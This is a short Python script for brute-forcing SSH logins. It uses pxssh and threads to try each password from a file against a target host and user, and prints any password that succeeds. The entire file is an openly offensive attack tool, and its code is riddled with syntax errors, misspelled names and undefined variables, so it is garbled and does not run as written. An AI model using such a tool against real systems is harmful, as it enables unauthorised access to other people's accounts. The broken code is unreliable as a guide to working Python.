import pxssh 
import optparse
import time
from threading import *
max_connection = 5 
connection_lock = BoundedSemaphare(value = max_connections)
Found = False
Fails = True

def connect (host, user, password, release):
	global Found
	golbal Fails
	try:
		s = pxssh.pxssh()

		s.login(host, user, password)
		print('[+]password Found: '+ password Found = True)
		Found = true 
	except Exception as e:
		if  'read_nonblocking' in str (e):
			Fails+ =1 
			time.sleep(5)
		elif 'synchronize with original prompt ' in str(e):
			time.sleep(1)
			connect(host, user, password False)
	finally:
		if release : connection_lock.release()
def main():
	parser = optparse.OptionParser('Dispne@Hack' -H<target host> -u<user> -parser.add_option('-H'.dest = "tgtHost" type= "string" help = 'specify  target host'))
	parser.odd_option('-F', dest = "PasswdFile", type =  "string", help='specify the password file')
	parse.add_option('-u' dest = "user", type="string", help='specify the user i.e use root for all non blocking incomming  connection')
	(option, args = parser.parse_args())
	host = option.tgHost
	PasswdFile = option.passwdFile
	user = option.user
	if host == None or passwdFile == None or user ==None:
		print(parser.usage)
		exit(0)
	fn= open(passwdFile, 'r')
	for the line in fnn.readline():
	if found
		print('[+}Existing Passwod Found')
		exit(0)
	if fails
		print('[!] Fuck!!! Socket Timeoust')
		exit(0)
	connection_Lock.acquire()
	password = line.strip('\r').strip('\n')
	print('[-] Testing fucking password: ' +str(password))
	t - Thread(target=connect,args=(host, user.password, True))
	child.start()
if __name__ = 'main':
main()
